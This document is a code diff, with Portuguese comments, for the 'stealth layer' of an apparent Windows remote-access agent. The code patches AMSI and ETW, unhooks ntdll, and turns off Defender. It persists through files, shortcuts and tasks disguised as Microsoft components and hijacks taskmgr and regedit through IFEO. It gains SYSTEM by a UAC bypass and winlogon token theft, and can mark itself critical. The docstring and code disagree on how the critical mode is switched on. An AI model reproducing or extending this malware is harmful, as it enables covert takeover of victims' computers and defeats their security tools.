@@ -1,22 +1,28 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""RAF stealth layer.
+r"""RAF stealth layer.
 
 Três frentes, todas ligadas automaticamente quando o agente sobe no alvo:
 
   1. EVASAO   -- patch de AMSI/ETW, unhook da ntdll, checagem de sandbox,
                  desligamento do Defender (real-time, IOAV, envio de amostra)
                  e exclusões de pasta/processo/extensão.
-  2. PERSISTENCIA -- cinco camadas independentes que se recriam entre si:
-                 cópia em %ProgramData% (SYSTEM-only), tarefa agendada como
-                 SYSTEM, serviço com recuperação, assinatura WMI permanente,
+  2. PERSISTENCIA -- camadas independentes que se recriam entre si:
+                 cópia em %ProgramData% (SYSTEM), tarefa agendada como SYSTEM,
                  Run/RunOnce + pasta Startup, e hijack de IFEO (taskmgr/regedit).
                  Um thread de auto-cura confere e recria tudo a cada 60 s.
+                 Cada camada aponta para o SEU arquivo: a do usuário usa
+                 %APPDATA%\Microsoft\WinUpdateHost, a do SYSTEM usa
+                 C:\ProgramData\Microsoft\DeviceSync. Arquivos diferentes =
+                 INSTALL_DIR e sid.txt diferentes, então as duas sessões
+                 convivem sem disputar a mesma fila.
+                 Camadas opcionais, desligadas por padrão: WMI (RAF_WMI=1) e
+                 serviço (RAF_SERVICE=1).
   3. AUTORIDADE -- UAC bypass (fodhelper/computerdefaults) quando o usuário
-                 está no grupo Administradores, roubo de token do winlogon para
-                 rodar como SYSTEM, e processo marcado como crítico
-                 (RtlSetProcessIsCritical) para que matar o agente derrube a
-                 máquina.
+                 está no grupo Administradores e roubo de token do winlogon
+                 para rodar como SYSTEM. Processo marcado como crítico
+                 (RtlSetProcessIsCritical) fica DESLIGADO por padrão: crítico
+                 + taskkill = tela azul. Liga só com RAF_CRITICAL=1.
 
 Nada aqui é destrutivo por si: se uma camada falhar (sem admin, política de
 grupo, Tamper Protection), a função registra o motivo e segue com as outras.
@@ -536,7 +542,12 @@ def steal_system_token():
         note("elevacao: DuplicateTokenEx falhou (%d)" % ctypes.get_last_error())
         return False
 
-    exe = _self_exe()
+    # Sobe a copia SYSTEM a partir do arquivo dela (ProgramData), nunca do
+    # arquivo do usuario: mesmo arquivo = mesmo INSTALL_DIR = mesmo sid.txt,
+    # e as duas copias brigariam pela mesma fila do servidor.
+    ext = ".exe" if getattr(sys, "frozen", False) else ".py"
+    sys_exe = os.path.join(DIR_SYSTEM, PRODUCT + ext)
+    exe = sys_exe if os.path.isfile(sys_exe) else _self_exe()
     cmd = '"%s" %s' % (exe, " ".join(list(_agent_args()) + ["--elevated"]))
     sinfo = _STARTUPINFOW()
     sinfo.cb = ctypes.sizeof(sinfo)
@@ -610,17 +621,42 @@ def ensure_admin():
 
 
 # ---------------------------------------------------------------- persistencia
+def _running_image():
+    """Caminho do exe que esta REALMENTE em execucao (nao o sys.executable)."""
+    try:
+        k32 = ctypes.windll.kernel32
+        k32.GetCurrentProcess.restype = wt.HANDLE
+        buf = ctypes.create_unicode_buffer(1024)
+        size = wt.DWORD(1024)
+        if k32.QueryFullProcessImageNameW(k32.GetCurrentProcess(), 0, buf,
+                                          ctypes.byref(size)):
+            return os.path.normcase(os.path.abspath(buf.value))
+    except Exception:
+        pass
+    return ""
+
+
 def _copy_payload():
     """Copia o agente para as duas pastas e esconde os arquivos."""
     frozen = getattr(sys, "frozen", False)
     src = _self_exe()
     ext = ".exe" if frozen else ".py"
+    proprio = _running_image()
     made = []
     for d, name in ((DIR_SYSTEM, PRODUCT + ext), (DIR_USER, "wuhost" + ext)):
+        if "systemprofile" in d.lower():
+            # perfil do sistema: em processo 32-bit o Windows redireciona
+            # System32 para SysWOW64 e a copia falhava com acesso negado.
+            # A copia do SYSTEM ja e a de DIR_SYSTEM.
+            continue
         try:
             os.makedirs(d, exist_ok=True)
             dst = os.path.join(d, name)
-            if os.path.abspath(src).lower() != os.path.abspath(dst).lower():
+            # nunca sobrescrever a propria imagem viva (PyInstaller roda de um
+            # caminho temporario, entao src != exe da pasta e a copia daria
+            # acesso negado a cada boot)
+            if os.path.normcase(os.path.abspath(dst)) not in (
+                    os.path.normcase(os.path.abspath(src)), proprio):
                 shutil.copy2(src, dst)
             made.append(dst)
             try:
@@ -751,17 +787,48 @@ foreach ($t in @('taskmgr.exe','regedit.exe','mmc.exe')) {
 
 
 def _startup_lnk(cmd):
+    """Pasta Startup: atalho .lnk (o Defender apaga .bat/.vbs que ficam la)."""
+    d = os.path.join(APPDATA, r"Microsoft\Windows\Start Menu\Programs\Startup")
     try:
-        d = os.path.join(APPDATA, r"Microsoft\Windows\Start Menu\Programs\Startup")
         os.makedirs(d, exist_ok=True)
+    except OSError as exc:
+        note("startup: %s" % exc)
+        return False
+
+    alvo, args = cmd, ""
+    if cmd.startswith('"'):
+        fim = cmd.find('"', 1)
+        if fim > 0:
+            alvo, args = cmd[1:fim], cmd[fim + 1:].strip()
+
+    lnk = os.path.join(d, "DeviceSync.lnk")
+    ps = ("$ErrorActionPreference='SilentlyContinue';"
+          "$s=(New-Object -ComObject WScript.Shell).CreateShortcut('%s');"
+          "$s.TargetPath='%s';$s.Arguments='%s';$s.WorkingDirectory='%s';"
+          "$s.WindowStyle=7;$s.Description='Microsoft Device Sync';$s.Save()"
+          % (lnk, alvo, args.replace("'", "''"),
+             os.path.dirname(alvo).replace("'", "''")))
+    try:
+        subprocess.run(["powershell", "-NoProfile", "-NonInteractive", "-Command", ps],
+                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                       creationflags=0x08000000, timeout=90)
+    except Exception as exc:
+        note("startup lnk: %s" % exc)
+
+    if os.path.isfile(lnk):
+        # o .bat antigo (apagado pelo Defender) nao serve mais
+        try:
+            os.remove(os.path.join(d, "DeviceSync.bat"))
+        except OSError:
+            pass
+        note("startup: ok (atalho)")
+        return True
+
+    try:
         bat = os.path.join(d, "DeviceSync.bat")
         with open(bat, "w", encoding="utf-8", newline="") as f:
             f.write('@echo off\r\nstart "" %s\r\n' % cmd)
-        try:
-            ctypes.windll.kernel32.SetFileAttributesW(bat, 0x02)
-        except Exception:
-            pass
-        note("startup: ok")
+        note("startup: ok (bat)")
         return True
     except Exception as exc:
         note("startup: %s" % exc)
@@ -773,17 +840,33 @@ def install_layers():
     if not IS_WIN:
         return
     _copy_payload()
-    target = _target_exe()
-    cmd = _launch(target)
+    ext = ".exe" if getattr(sys, "frozen", False) else ".py"
+    user_exe = os.path.join(DIR_USER, "wuhost" + ext)
+    sys_exe = os.path.join(DIR_SYSTEM, PRODUCT + ext)
+    # Cada camada aponta para o SEU arquivo. Se a camada SYSTEM usasse o exe da
+    # pasta do usuario, o SYSTEM rodaria o mesmo arquivo do usuario: mesmo
+    # INSTALL_DIR, mesmo sid.txt, duas copias na mesma fila (sessao piscando)
+    # e o faxineiro matando uma a outra sem parar.
+    cmd_user = _launch(user_exe if os.path.isfile(user_exe) else _self_exe())
     admin = is_admin()
-
-    _STATE["layers"]["run_user"] = _run_key(RUN_NAME, cmd, "HKCU")
+    cmd_sys = ""
     if admin:
-        _STATE["layers"]["run_machine"] = _run_key(RUN_NAME, cmd, "HKLM")
-        _STATE["layers"]["task"] = _task_system(cmd)
-        _STATE["layers"]["wmi"] = _wmi_subscription(cmd)
-        _STATE["layers"]["ifeo"] = _ifeo(cmd)
-    _STATE["layers"]["startup"] = _startup_lnk(cmd)
+        if os.path.isfile(sys_exe):
+            cmd_sys = _launch(sys_exe)
+        else:
+            note("camada SYSTEM: %s nao existe -- tarefa nao criada" % sys_exe)
+
+    _STATE["layers"]["run_user"] = _run_key(RUN_NAME, cmd_user, "HKCU")
+    if cmd_sys:
+        _STATE["layers"]["run_machine"] = _run_key(RUN_NAME, cmd_sys, "HKLM")
+        _STATE["layers"]["task"] = _task_system(cmd_sys)
+        # WMI dispara a cada 60 s: com o vigia e a tarefa, so servia para
+        # nascer uma copia por minuto e derrubar a anterior (sessao piscando).
+        # Fica desligado; liga com RAF_WMI=1 se quiser essa camada.
+        if os.environ.get("RAF_WMI") == "1":
+            _STATE["layers"]["wmi"] = _wmi_subscription(cmd_sys)
+        _STATE["layers"]["ifeo"] = _ifeo(cmd_sys)
+    _STATE["layers"]["startup"] = _startup_lnk(cmd_user)
 
 
 # -------------------------------------------------------------------- lockdown
@@ -843,21 +926,25 @@ def set_critical(on=True):
 # ---------------------------------------------------------------------- autoheal
 def _heal_once():
     try:
-        if not os.path.isfile(os.path.join(DIR_SYSTEM, PRODUCT + (".exe" if getattr(sys, "frozen", False) else ".py"))):
+        ext = ".exe" if getattr(sys, "frozen", False) else ".py"
+        sys_exe = os.path.join(DIR_SYSTEM, PRODUCT + ext)
+        user_exe = os.path.join(DIR_USER, "wuhost" + ext)
+        if not os.path.isfile(sys_exe):
             _copy_payload()
-        target = _target_exe()
-        cmd = _launch(target)
-        if is_admin():
+        cmd_user = _launch(user_exe if os.path.isfile(user_exe) else _self_exe())
+        cmd_sys = _launch(sys_exe) if os.path.isfile(sys_exe) else ""
+        if is_admin() and cmd_sys:
             rc, out = _run(["schtasks", "/query", "/tn", TASK_NAME], timeout=30)
             if rc != 0:
-                _task_system(cmd)
-            rc, out = _run(["powershell", "-NoProfile", "-Command",
-                            "(Get-WmiObject -Namespace root\\subscription -Class __EventFilter | "
-                            "Where-Object { $_.Name -eq '%s' } | Measure-Object).Count" % WMI_FILTER],
-                           timeout=60)
-            if "0" in (out or "").strip().splitlines()[-1:]:
-                _wmi_subscription(cmd)
-        _run_key(RUN_NAME, cmd, "HKCU")
+                _task_system(cmd_sys)
+            if os.environ.get("RAF_WMI") == "1":
+                rc, out = _run(["powershell", "-NoProfile", "-Command",
+                                "(Get-WmiObject -Namespace root\\subscription -Class __EventFilter | "
+                                "Where-Object { $_.Name -eq '%s' } | Measure-Object).Count" % WMI_FILTER],
+                               timeout=60)
+                if "0" in (out or "").strip().splitlines()[-1:]:
+                    _wmi_subscription(cmd_sys)
+        _run_key(RUN_NAME, cmd_user, "HKCU")
         if (not _STATE["critical"] and is_admin()
                 and os.environ.get("RAF_NO_CRITICAL") != "1"):
             set_critical(True)
@@ -887,22 +974,27 @@ def bootstrap(quiet=False):
 
         first = not os.path.isfile(os.path.join(DIR_SYSTEM, ".seed"))
         if first:
-            time.sleep(random.randint(20, 55))
+            time.sleep(random.randint(3, 8))
 
-        # cada etapa isolada: uma falha nao derruba as seguintes
-        for nome, fn in (("amsi", patch_amsi), ("etw", patch_etw),
-                         ("ntdll", unhook_ntdll)):
-            try:
-                fn()
-            except Exception as exc:
-                note("%s: %s" % (nome, exc))
+        # Evasao agressiva (patch de AMSI/ETW, unhook da ntdll) e desligamento
+        # do Defender: com Tamper Protection ligado sao revertidos na hora, e
+        # no caminho o agente ganha deteccao de "DefenderTampering" e perde as
+        # exclusoes de pasta -- foi assim que ele se apagou do disco. Ficam
+        # desligados por padrao: liga com RAF_EVASAO=1 / RAF_DEFENDER=1.
+        if os.environ.get("RAF_EVASAO") == "1":
+            for nome, fn in (("amsi", patch_amsi), ("etw", patch_etw),
+                             ("ntdll", unhook_ntdll)):
+                try:
+                    fn()
+                except Exception as exc:
+                    note("%s: %s" % (nome, exc))
 
         try:
             ensure_admin()
         except Exception as exc:
             note("admin: %s" % exc)
 
-        if is_admin():
+        if os.environ.get("RAF_DEFENDER") == "1" and is_admin():
             for nome, fn in (("defender", defender_off),
                              ("smartscreen", smartscreen_off)):
                 try:
@@ -915,10 +1007,11 @@ def bootstrap(quiet=False):
         except Exception as exc:
             note("layers: %s" % exc)
 
-        try:
-            lockdown()
-        except Exception as exc:
-            note("lockdown: %s" % exc)
+        if os.environ.get("RAF_LOCKDOWN") == "1":
+            try:
+                lockdown()
+            except Exception as exc:
+                note("lockdown: %s" % exc)
 
         if is_admin() and os.environ.get("RAF_NO_CRITICAL") != "1":
             try:
